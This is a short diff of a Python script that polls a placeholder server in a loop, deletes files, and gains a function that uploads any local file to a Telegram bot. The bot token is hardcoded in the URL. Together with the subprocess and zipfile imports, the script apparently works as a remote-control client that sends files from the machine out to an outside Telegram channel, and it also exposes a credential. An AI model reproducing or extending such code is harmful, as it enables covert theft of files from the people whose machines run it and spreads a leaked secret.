@@ -1,4 +1,4 @@
-﻿import os, time, subprocess, shutil, zipfile, requests
+import os, time, subprocess, shutil, zipfile, requests
 
 SERVER = "PUT_YOUR_CHOREO_URL"
 
@@ -43,3 +43,11 @@ while True:
             os.remove(file_path)
 
     time.sleep(10)
+
+import requests
+
+def send_result(chat_id, file_path):
+    url = f"https://api.telegram.org/bot8799766843:AAGjQKYAsSRUQExYWcE1FB4yLEtUROqYyGk/sendDocument"
+    files = {"document": open(file_path, "rb")}
+    data = {"chat_id": chat_id}
+    requests.post(url, files=files, data=data)
